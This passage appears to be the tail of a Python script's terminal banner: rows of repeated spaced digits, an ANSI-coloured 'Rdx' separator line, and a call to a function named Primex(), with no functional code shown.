   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
  1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")


Primex()